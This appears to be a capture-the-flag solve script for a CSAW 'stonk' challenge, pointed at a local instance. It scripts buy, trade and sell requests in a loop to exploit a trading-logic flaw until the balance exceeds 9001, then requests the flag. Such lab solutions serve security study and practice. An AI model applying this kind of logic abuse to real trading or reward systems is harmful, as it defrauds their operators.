import requests
import json

ADDRESS = "http://stonk.csaw.io"
ADDRESS = "http://0.0.0.0"
# PORT = 4660
PORT = 4657

def sendGET(subpath) -> str:
    try:
        response = requests.get(ADDRESS + ":" + str(PORT) + subpath)
        response.raise_for_status()  # Raises an exception for bad status codes
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None


def sendPOST(subpath, data) -> str:
    url = ADDRESS + ":" + str(PORT) + subpath
    payload = data

    try:
        response = requests.post(url, data=payload)
        response.raise_for_status()  # Raises an exception for bad status codes
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")
        return None

def buyStock(key, str):
    body = sendPOST("/buy", {"key":key, "stock": str})
    return body

def sellStock(key, str):
    body = sendPOST("/sell", {"key":key, "stock": str})
    return body

def tradeStock(key, str, str1):
    body = sendPOST("/trade", {"key":key, "stock": str, "stock1": str1})
    return body

def listCalls() -> str:
    body = sendGET("/listCalls")
    out = json.loads(body)
    return "\n".join((str(i["name"]) + " at " + str(i["price"]) for i in out.values()))

def flag(key) -> str:
    body = sendPOST("/flag", {"key":key})
    return body

def status(key) -> str:
    body = sendPOST("/login", {"key":key})
    return body



key = "y0un9n132n132"
buyStock(key, "BROOKING")
for x in range(9):
    buyStock(key, "BROOKING")

for x in range(10):
    tradeStock(key, "BROOKING", "BURPSHARKHAT")
    buyStock(key, "BURPSHARKHAT")
    print(status(key))
res = json.loads(status(key))['BROOKING']

while(1):
    sellStock(key, "BROOKING")
    res = json.loads(status(key))
    if res['balance'] > 9001:
        break
print(flag(key, ))